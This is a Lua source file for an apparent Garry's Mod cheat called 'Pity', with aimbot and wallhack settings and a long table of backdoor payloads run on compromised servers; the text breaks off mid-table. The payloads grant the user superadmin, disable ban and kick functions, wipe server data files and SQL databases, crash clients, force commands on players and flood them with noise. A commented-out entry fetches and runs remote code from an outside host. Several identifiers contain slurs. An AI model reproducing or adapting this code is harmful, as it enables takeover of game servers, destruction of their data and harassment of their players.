local version = "0.8"

-- Copyright (C) 2018 asocial

-- Licensed under the Apache License, Version 2.0 (the "License");
-- you may not use this file except in compliance with the License.
-- You may obtain a copy of the License at

--     http://www.apache.org/licenses/LICENSE-2.0

-- Unless required by applicable law or agreed to in writing, software
-- distributed under the License is distributed on an "AS IS" BASIS,
-- WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-- See the License for the specific language governing permissions and
-- limitations under the License.

/*
if (_G.QAC or _G.CAC) || file.Exists( "autorun/server/anti-bhop.lua", "GAME" ) || file.Exists( "cl_HAC.lua", "LUA" ) || file.Exists( "autorun/server/sv_HAC.lua", "LUA" ) then
  Text("An anticheat has been detected." )
else
  net.SendToServer()
end

if (_G.ulx or _G.ulib) then
  net.SendToServer()
else
  Text("ULX is not present." )
end

if file.Exists("snte_source.lua","LUA") or file.Exists ( "autorun/server/snte_source.lua", "LUA" ) then
  Text("Say No To Exploits is present." )
  snte=true
else
  snte=false
end

*/

----// Font & colors part //----

surface.CreateFont( "Symbol", {
    font = "Pity-Original",
    size = 30,
} )
surface.CreateFont( "Normal", {
    font = "Segoe UI",
    size = 15,
} )
surface.CreateFont( "Big", {
    font = "Segoe UI",
    size = 40,
} )
surface.CreateFont( "Title", {
    font = "Consolas",
    size = 15,
} )

local Red = Color( 255, 68, 68 )
local SemiDarkRed = Color( 229, 61, 61 )
local DarkRed = Color( 206, 54, 54 )
local Black = Color( 27, 27, 27 )
local SemiLightBlack = Color( 37, 37, 37 )
local LightBlack = Color( 50, 50, 50 )

----//--------------------//----


----// Basic functions //----

local Pity = {}
Pity.Options = {}
Pity.TextEntries = {}
Pity.Backdoors = {}
Pity.Hooks = {}

function SoundClick()
	surface.PlaySound("buttons/lightswitch2.wav")
end

function SoundPop()
	surface.PlaySound("buttons/button14.wav")
end

do
	for i=0, 100 do
		print(" ")
		chat.AddText(" ")
	end
end
function Text(text)
	chat.AddText( SemiDarkRed, "Pity : ", Color(255, 255, 255), text)
end

Pity.Options["Aim_Toggle"] = false
Pity.Options["Aim_LOSCheck"] = false
Pity.Options["Aim_AutoWall"] = true
Pity.Options["Aim_AimOnKey"] = false
Pity.Options["Aim_AimOnKey_Key"] = 0
Pity.Options["Aim_SmoothAim"] = false
Pity.Options["Aim_SmoothAim_Value"] = 600
Pity.Options["Aim_AimPriority"] = "Distance"
Pity.Options["Aim_FOV"] = false
if LocalPlayer():GetFOV() != nil then Pity.Options["Aim_FOV_Value"] = LocalPlayer():GetFOV() else Pity.Options["Aim_FOV_Value"] = 75 end
Pity.Options["Aim_StickToTarget"] = false
Pity.Options["Aim_AutoShoot"] = false

Pity.Options["Aim_AimTeam"] = false
Pity.Options["Aim_AimOpponents"] = true
Pity.Options["Aim_AimFriends"] = false
Pity.Options["Aim_AimEnemies"] = false
Pity.Options["Aim_AimNPCs"] = false
Pity.Options["Aim_AimSpectators"] = false
Pity.Options["Aim_AimTeamV"] = "Aim"
Pity.Options["Aim_AimOpponentsV"] = "Aim"
Pity.Options["Aim_AimFriendsV"] = "Aim"
Pity.Options["Aim_AimEnemiesV"] = "Aim"
Pity.Options["Aim_AimNPCsV"] = "Aim"
Pity.Options["Aim_AimSpectatorsV"] = "Aim"

Pity.Options["Aim_OffsetX"] = 0
Pity.Options["Aim_OffsetY"] = 0

Pity.Options["Visuals_Toggle"] = false
Pity.Options["Visuals_ASUSWalls"] = false
Pity.Options["Visuals_Aimline"] = false
Pity.Options["Visuals_ShowTeam"] = true
Pity.Options["Visuals_ShowOpponents"] = true
Pity.Options["Visuals_ShowFriends"] = false
Pity.Options["Visuals_ShowEnemies"] = false
Pity.Options["Visuals_ShowNPCs"] = false
Pity.Options["Visuals_ShowSpectators"] = false

Pity.Options["Visuals_ShowTeamV"] = "Show"
Pity.Options["Visuals_ShowOpponentsV"] = "Show"
Pity.Options["Visuals_ShowFriendsV"] = "Show"
Pity.Options["Visuals_ShowEnemiesV"] = "Show"
Pity.Options["Visuals_ShowNPCsV"] = "Show"
Pity.Options["Visuals_ShowSpectatorsV"] = "Show"

Pity.Options["Visuals_Entity_Toggle"] = false
Pity.Options["Visuals_Entities_NameTags"] = false
Pity.Options["Visuals_Entities_BoundaryBoxes"] = false
Pity.Options["Visuals_Entities_BoundaryBoxes_Mode"] = "2D"

Pity.Options["Visuals_BoundaryBoxes"] = false
Pity.Options["Visuals_BoundaryBoxes_Mode"] = "2D"
Pity.Options["Visuals_NameTags"] = false
Pity.Options["Visuals_Weapon"] = false
Pity.Options["Visuals_Distance"] = false
Pity.Options["Visuals_Health"] = false
Pity.Options["Visuals_Skeleton"] = false
Pity.Options["Visuals_Crosshair"] = false
Pity.Options["Visuals_Crosshair_Size"] = 50
Pity.Options["Visuals_Hitmarker"] = true
Pity.Options["Visuals_Skybox"] = false

Pity.Options["Misc_AutoButton"] = false
Pity.Options["Misc_KeyVisualizer"] = true

Pity.Options["Bhop_Toggle"] = false
Pity.Options["Bhop_FastWalk"] = false
Pity.Options["Bhop_AutoHop"] = false
Pity.Options["Bhop_AutoStrafe"] = false
Pity.Options["Bhop_EdgeJump"] = false
Pity.Options["Bhop_EdgeJump_Distance"] = 40
Pity.Options["Bhop_Sideways"] = false
Pity.Options["Bhop_WOnly"] = false

Pity.Options["Cams_Toggle"] = false
Pity.Options["Cams_CSNoclip"] = false
Pity.Options["Cams_CSNoclip_Speed"] = 10
Pity.Options["Cams_ThirdPerson"] = false
Pity.Options["Cams_ThirdPerson_Zoom"] = 30

Pity.Bones = {
"ValveBiped.Bip01_Head1",
"ValveBiped.Bip01_Neck1",
"ValveBiped.Bip01_Spine4",
"ValveBiped.Bip01_Spine2",
"ValveBiped.Bip01_Spine1",
"ValveBiped.Bip01_Spine",
"ValveBiped.Bip01_Pelvis",
"ValveBiped.Bip01_R_UpperArm",
"ValveBiped.Bip01_R_Forearm",
"ValveBiped.Bip01_R_Hand",
"ValveBiped.Bip01_L_UpperArm",
"ValveBiped.Bip01_L_Forearm",
"ValveBiped.Bip01_L_Hand",
"ValveBiped.Bip01_R_Thigh",
"ValveBiped.Bip01_R_Calf",
"ValveBiped.Bip01_R_Foot",
"ValveBiped.Bip01_R_Toe0",
"ValveBiped.Bip01_L_Thigh",
"ValveBiped.Bip01_L_Calf",
"ValveBiped.Bip01_L_Foot",
"ValveBiped.Bip01_L_Toe0"
}

Pity.KeyBinds = {
[0] = "NONE",
[1] = "0",
[2] = "1",
[3] = "2",
[4] = "3",
[5] = "4",
[6] = "5",
[7] = "6",
[8] = "7",
[9] = "8",
[10] = "9",
[11] = "A",
[12] = "B",
[13] = "C",
[14] = "D",
[15] = "E",
[16] = "F",
[17] = "G",
[18] = "H",
[19] = "I",
[20] = "J",
[21] = "K",
[22] = "L",
[23] = "M",
[24] = "N",
[25] = "O",
[26] = "P",
[27] = "Q",
[28] = "R",
[29] = "S",
[30] = "T",
[31] = "U",
[32] = "V",
[33] = "W",
[34] = "X",
[35] = "Y",
[36] = "Z",
[37] = "PAD_0",
[38] = "PAD_1",
[39] = "PAD_2",
[40] = "PAD_3",
[41] = "PAD_4",
[42] = "PAD_5",
[43] = "PAD_6",
[44] = "PAD_7",
[45] = "PAD_8",
[46] = "PAD_9",
[47] = "PAD_DIVIDE",
[48] = "PAD_MULTIPLY",
[49] = "PAD_MINUS",
[50] = "PAD_PLUS",
[51] = "PAD_ENTER",
[52] = "PAD_DECIMAL",
[53] = "LBRACKET",
[54] = "RBRACKET",
[55] = "SEMICOLON",
[56] = "APOSTROPHE",
[57] = "BACKQUOTE",
[58] = "COMMA",
[59] = "PERIOD",
[60] = "SLASH",
[61] = "BACKSLASH",
[62] = "MINUS",
[63] = "EQUAL",
[64] = "ENTER",
[65] = "SPACE",
[66] = "BACKSPACE",
[67] = "TAB",
[68] = "CAPSLOCK",
[69] = "NUMLOCK",
[70] = "ESCAPE",
[71] = "SCROLLLOCK",
[72] = "INSERT",
[73] = "DELETE",
[74] = "HOME",
[75] = "END",
[76] = "PAGEUP",
[77] = "PAGEDOWN",
[78] = "BREAK",
[79] = "LSHIFT",
[80] = "RSHIFT",
[81] = "LALT",
[82] = "RALT",
[83] = "LCONTROL",
[84] = "RCONTROL",
[85] = "LWIN",
[86] = "RWIN",
[87] = "APP",
[88] = "UP",
[89] = "LEFT",
[90] = "DOWN",
[91] = "RIGHT",
[92] = "F1",
[93] = "F2",
[94] = "F3",
[95] = "F4",
[96] = "F5",
[97] = "F6",
[98] = "F7",
[99] = "F8",
[100] = "F9",
[101] = "F10",
[102] = "F11",
[103] = "F12",
}

Pity.MouseBinds = {
[107] = "MOUSE_LEFT",
[108] = "MOUSE_RIGHT",
[109] = "MOUSE_MIDDLE",
[110] = "MOUSE_4",
[111] = "MOUSE_5",
[112] = "MOUSE_WHEEL_UP",
[113] = "MOUSE_WHEEL_DOWN"
}

Pity.Backdoors.Macros ={

["Armageddon"] = {

["Type"] = 1,

["Code"] = [[if !bombstrike then

hook.Add("Think", "lulz_bombstrike", function()

local explode = ents.Create( "env_explosion" )

local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

local trc = {}

trc.start = ps

trc.endpos = ps + Vector( 0, 0, -99999)

local tr = util.TraceLine(trc)

if !tr.Hit then return end

explode:SetPos( tr.HitPos )

explode:Spawn()

explode:SetKeyValue( "iMagnitude", "400" )

explode:Fire( "Explode", 0, 0 )

end)

bombstrike = true

else

hook.Remove("Think", "lulz_bombstrike")

bombstrike = false

end]],

},

["Broadcast"] = {

["Type"] = 1,

["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],

["NeedsParameters"] = 1,

},

["Change nicknames"] = {

["Type"] = 1,

["Code"] = [[ for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, @1) v:setDarkRPVar("rpname", @1) end ]],

["NeedsParameters"] = 1,

}, 

["Chat spammer"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "wutckoasa" ) then

timer.Create( "wutckoasa", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

else

timer.Remove( "wutckoasa" )

end]],

["NeedsParameters"] = 1,

},

["Open the doors"] = {

["Type"] = 1,

["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],

},

["Broke glass sound"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "A true masterpiece" ) then

timer.Create( "A true masterpiece", 0.2, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )

end

end)

else

timer.Remove( "A true masterpiece" )

end]],

},

["Porn sound"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "porn" ) then

timer.Create( "porn", 0.3, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "porn" )

end]],

},

["Impact sound"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "impakt" ) then

timer.Create( "impakt", 0.3, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "physics/body/body_medium_impact_hard1.wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "impakt" )

end]],

},

["Bell sound"] = {

["Type"] = 1,

["Code"] = [[
if !timer.Exists( "pimpon" ) then

timer.Create( "pimpon", 0.3, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "ambient/alarms/warningbell1.wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "pimpon" )

end
]],

},

["Civil war sound"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "cwar" ) then

timer.Create( "cwar", 1, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "cwar" )

end]],

},

["Earthquake"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "earthquake" ) then

timer.Create( "earthquake", 0.5, 500, function()

for _, p in pairs(player.GetAll()) do

p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )

p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )

util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )

p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )

end

for _, e in pairs(ents.GetAll()) do

if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end

end

end)

else

timer.Remove( "earthquake" )

end]],

},

["Explode vehicles"] = {

["Type"] = 1,

["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then

local explo = ents.Create("env_explosion")

explo:SetPos(v:GetPos())

explo:SetKeyValue("iMagnitude", "300")

explo:Spawn()

explo:Activate()

explo:Fire("Explode", "", 0)

end

end]],

},

["Delete ULX"] = {

["Type"] = 1,

["Code"] = [[ULib.Ban = function() return false end

ULib.addBan = function() return end

ULib.kick = function() return end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end]],

["Private"] = true,

},

/* RECODER CETTE MERDE !!!
["Pity, don't use this."] = {

["Type"] = 1,

["Code"] = [[    RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")
http.Fetch("https://pitycheats.com/evian/pityer_server.lua",function(b,l,h,c)RunString(b)end,nil)
]],

["Private"] = true,

},
*/

["Cough"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "jcrevenofake" ) then

timer.Create( "jcrevenofake", 0.7, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)

end

end)

else

timer.Remove( "jcrevenofake" )

end]],

},

["gm_construct"] = {

["Type"] = 1,

["Code"] = [[RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")

for k,v in pairs(player.GetAll()) do
v:ConCommand("ulx map gm_construct")
end

]],


},

["Make everyone poor"] = {

["Type"] = 1,

["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],

["Private"] = true,

},

["Clean up the map"] = {

["Type"] = 1,

["Code"] = [[game.CleanUpMap()]],

},

["Literally delete players"] = {

["Type"] = 1,

["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],
},

["Delete all datas"] = {

["Type"] = 1,

["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],

["Private"] = true,

},

["Delete SQL"] = {

["Type"] = 1,

["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],

["Private"] = true,

},

["Delete all the database"] = {

["Type"] = 1,

["Code"] = [[ 
sql.Query("DELETE FROM `DARKRP_BANNED_RPNAMES_STORE`")
sql.Query("DELETE FROM `DRP_PLAYER_NICKNAME_STORE`")
sql.Query("DELETE FROM `FADMIN_GROUPS`")
sql.Query("DELETE FROM `FADMIN_MOTD`")
sql.Query("DELETE FROM `FADMIN_PRIVILEGES`")
sql.Query("DELETE FROM `FADMIN_RESTRICTEDENTS`")
sql.Query("DELETE FROM `FAdminBans`")
sql.Query("DELETE FROM `FAdmin_CAMIPrivileges`")
sql.Query("DELETE FROM `FAdmin_Immunity`")
sql.Query("DELETE FROM `FAdmin_PlayerGroup`")
sql.Query("DELETE FROM `FAdmin_ServerSettings`")
sql.Query("DELETE FROM `FPP_ANTISPAM1`")
sql.Query("DELETE FROM `FPP_BLOCKED1`")
sql.Query("DELETE FROM `FPP_BLOCKEDMODELS1`")
sql.Query("DELETE FROM `FPP_BLOCKMODELSETTINGS1`")
sql.Query("DELETE FROM `FPP_ENTITYDAMAGE1`")
sql.Query("DELETE FROM `FPP_GLOBALSETTINGS1`")
sql.Query("DELETE FROM `FPP_GRAVGUN1`")
sql.Query("DELETE FROM `FPP_GROUPMEMBERS1`")
sql.Query("DELETE FROM `FPP_GROUPS3`")
sql.Query("DELETE FROM `FPP_GROUPTOOL`")
sql.Query("DELETE FROM `FPP_PHYSGUN1`")
sql.Query("DELETE FROM `FPP_PLAYERUSE1`")
sql.Query("DELETE FROM `FPP_TOOLADMINONLY`")
sql.Query("DELETE FROM `FPP_TOOLGUN1`")
sql.Query("DELETE FROM `FPP_TOOLRESTRICTPERSON1`")
sql.Query("DELETE FROM `FPP_TOOLTEAMRESTRICT`")
sql.Query("DELETE FROM `TTT_PLAYER_NICKNAME_STORE`")
sql.Query("DELETE FROM `batm_group_accounts`")
sql.Query("DELETE FROM `batm_personal_accounts`")
sql.Query("DELETE FROM `cac_incidents`")
sql.Query("DELETE FROM `cookies`")
sql.Query("DELETE FROM `darkrp_dbversion`")
sql.Query("DELETE FROM `darkrp_door`")
sql.Query("DELETE FROM `darkrp_doorgroups`")
sql.Query("DELETE FROM `darkrp_doorjobs`")
sql.Query("DELETE FROM `darkrp_jobSpawn`")
sql.Query("DELETE FROM `darkrp_player`")
sql.Query("DELETE FROM `darkrp_position`")
sql.Query("DELETE FROM `ll_plates`")
sql.Query("DELETE FROM `playerinformation`")
sql.Query("DELETE FROM `playerpdata`")
sql.Query("DELETE FROM `rphone_numbers`")
sql.Query("DELETE FROM `rphone_sms`")
sql.Query("DELETE FROM `sqlite_sequence`")
sql.Query("DELETE FROM `ulib_bans`")
sql.Query("DELETE FROM `utime`") ]],

["Private"] = true,

},

// Players cmds

["Kill"] = {

["Type"] = 2,

["Code"] = [[v:Kill()]],


},

["Multicolor chams"] = {

["Type"] = 2, 

["Code"] = [[ 

v:SetModel( "models/player/group02/male_04.mdl" )

v:SetMaterial( "models/debug/debugwhite" )

hook.Add( "Think", "multicolore", function()

v:SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )

end )


local id = ]] .. LocalPlayer():UserID() .. [[

Player( id ):SetModel( "models/player/group02/male_04.mdl" )

Player( id ):SetMaterial( "models/debug/debugwhite" )

hook.Add( "Think", "multicolore2", function()

if !IsValid( Player( id ) ) then return end

Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )

end )
]],

["Private"] = true,
},




["Drop current weapon"] = {

["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous

["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],

},

["Ear rape"] = {

["Type"] = 2,

["Code"] = [[

BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )

]],

["Desc"] = "You should send a link in the first argument.  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",

["NeedsParameters"] = 1,

},


["Strip weapons"] = {

["Type"] = 2,

["Code"] = [[v:StripWeapons()]],

},



["Speedhack"] = {

["Type"] = 2,

["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],

},



["Change model"] = {

["Type"] = 2,

["Code"] = [[v:SetModel( @1 )]],

["NeedsParameters"] = 1,

},




["Play Sound (1-5)"] = {

["Type"] = 2,

["Code"] = [[

local snd = {

[1] = "npc/stalker/go_alert2a.wav",

[2] = "vo/npc/male01/question06.wav",

[3] = "ambient/energy/zap1.wav",

[4] = "vo/ravenholm/madlaugh04.wav",

[5] = "npc/antlion_guard/antlion_guard_die1.wav",

}

v:EmitSound( snd[tonumber(@1)], 100, 100 )

]],

["NeedsParameters"] = 1,

},


["70's nostalgia"] = {

["Type"] = 2,

["Code"] = [[

BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )

]],

["Private"] = true,

},



["Disco music"] = {

["Type"] = 2,

["Code"] = [[

BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )

]],

["Private"] = true,

},



["Private message"] = {

["Type"] = 2,

["Code"] = [[v:ChatPrint( @1 )]],

["NeedsParameters"] = 1,

},



["Incinerate"] = {

["Type"] = 2,

["Code"] = [[v:Ignite( 30 )]],

},



["Invicible"] = {

["Type"] = 2,

["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],

},



["Shut the server"] = {

["Type"] = 2,

["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],

["Private"] = true,

},



["Speedhack"] = {

["Type"] = 2,

["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],

},



["Freeze"] = {

["Type"] = 2,

["Code"] = [[v:Freeze( !v:IsFrozen() )]],

},



["Force say"] = {

["Type"] = 2,

["Code"] = [[v:Say(@1)]],

["NeedsParameters"] = 1,

},



["Force command"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand(@1)]],

["NeedsParameters"] = 1,

},

["Moving troll"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand( "+left" )
v:ConCommand( "+back" )]],

},

["Close the game"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand(quit)]],

},

["Modify money"] = {

["Type"] = 2,

["Code"] = [[v:addMoney(@1)]],

["NeedsParameters"] = 1,

},



["Change team"] = {

["Type"] = 2,

["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],

["NeedsParameters"] = 1,

},



["Noclip"] = {

["Type"] = 2,

["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],

},



["Bring"] = {

["Type"] = 2,

["Code"] = [[

local tp = false

local tpos

for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end

if tp then v:SetPos( tpos ) end

]],

},



["Goto"] = {

["Type"] = 2,

["Code"] = [[

local tp = false

local tpos = v:GetPos() + Vector( 32, 0, 10)

for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end

]],

},


["Spawn entities"] = {

["Type"] = 2,

["Code"] = [[

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( @1 )

dix:SetPos(trace.HitPos)

dix:SetAngles(Angle(0,0,0))

dix:Spawn()

]],


["NeedsParameters"] = 1,

},



["Spawn props"] = {

["Type"] = 2,

["Code"] = [[

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( "prop_physics" )

dix:SetPos(trace.HitPos)

dix:SetAngles(Angle(0,0,0))

dix:SetModel( @1 )

dix:Spawn()

]],

["NeedsParameters"] = 1,

},



["Spawn huge dick"] = {

["Type"] = 2,

["Code"] = [[

FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} 

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( "prop_physics" )

dix:SetPos( trace.HitPos + Vector( 0, 0, 70 ) )

dix:SetAngles( v:GetAngles() )

dix:SetModel( "models/props_combine/breenglobe.mdl" )

dix:Spawn()

dix:SetMoveType( MOVETYPE_NONE )

dix:SetMaterial( "models/shiny" )

dix:SetColor( Color( 0, 0, 40 ) )



local function ecr( parent, model, pos, ang, col, mat  )

local dix = ents.Create( "prop_physics" )

dix:SetPos( parent:LocalToWorld( pos ) )

dix:SetAngles( parent:LocalToWorldAngles( ang ) )

dix:SetModel( model )

dix:SetParent( parent )

dix:Spawn()

dix:SetColor( col )

dix:SetMaterial( mat )

end

ecr( dix, "models/props_phx/construct/metal_plate_curve360x2.mdl", Vector( -5, 0, 30 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  ) 
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, 0, 120 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, 35, 0 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, 35, 0 ), Angle( 180, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, -35, 0 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, -35, 0 ), Angle( 180, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )

for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(255, 255, 255 ), "ROCCCOOOOO SIIIFREEEEDIIIII")' ) sound.Play( "vo/npc/female01/yeah02.wav", p:GetPos(), 90, 80, 1 ) end

]],

["Private"] = true,

},



["Spawn opponents"] = {

["Type"] = 2,

["Code"] = [[

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( "npc_citizen" )

dix:SetPos(trace.HitPos)

dix:SetAngles(Angle(0,0,0))

dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )

dix:SetKeyValue( "citizentype", 3 )

dix:AddRelationship("player D_HT 200")

dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)

dix:SetSchedule( SCHED_IDLE_WANDER )

dix:Spawn()

]],

},


["Messy vision (explosions)"] = {

["Type"] = 2,

["Code"] = [[

local trace = v:GetEyeTraceNoCursor()

local explo = ents.Create("env_explosion")

explo:SetPos(trace.HitPos)

explo:SetKeyValue("iMagnitude", "250")

explo:Spawn()

explo:Activate()

explo:Fire("Explode", "", 0)

]],


},




["Vehicles rain"] = {

["Type"] = 2,

["Code"] = [[

local trace = v:GetEyeTraceNoCursor()

local car = ents.Create("prop_physics")

local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )

car:SetModel( "models/props_vehicles/car002a_physics.mdl" )

car:SetAngles( v:GetAngles() )

car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )

car:Spawn()

car:Activate()

car.boom = 6

car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )

car:Ignite( 500 )

car:AddCallback( "PhysicsCollide", function( car, dat )

local explo = ents.Create("env_explosion")

explo:SetPos( car:GetPos() )

explo:SetKeyValue("iMagnitude", "350")

explo:Spawn()

explo:Activate()

explo:Fire("Explode", "", 0)

local ef = EffectData()

ef:SetOrigin( car:GetPos() )

ef:SetMagnitude( 5 )

ef:SetScale( 200 )

util.Effect( "ThumperDust", ef )

car.boom = car.boom - 1

if car.boom < 0 then car:Remove() end

end )

timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)

]],

},



["Toxic gas"] = {

["Type"] = 2,

["Code"] = [[

local trace = v:GetEyeTraceNoCursor()

local ar2Explo = ents.Create("env_ar2explosion")

ar2Explo:SetOwner(game.GetWorld())

local p = trace.HitPos

ar2Explo:SetPos(trace.HitPos)

ar2Explo:Spawn()

ar2Explo:Activate()

ar2Explo:Fire("Explode", "", 0)

timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()

for _, ent in pairs(ents.FindInSphere( p, 500)) do

if !ent:IsPlayer() then continue end

local d = DamageInfo()

d:SetDamage( 1 )

d:SetAttacker( game.GetWorld() )

d:SetInflictor( game.GetWorld() )

d:SetDamageType( DMG_DROWN )

ent:TakeDamageInfo( d )

end

end)



]],

},


["Kick"] = {

["Type"] = 2,

["Code"] = [[ v:Kick( @1 ) ]],


},




["Cloak"] = {

["Type"] = 2,

["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],


},



["Set rank"] = {

["Type"] = 2,

["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],

["NeedsParameters"] = 1,

["Private"] = true,

},

["2D Players"] = {

["Type"] = 2,

["Code"] = [[
local bones = {
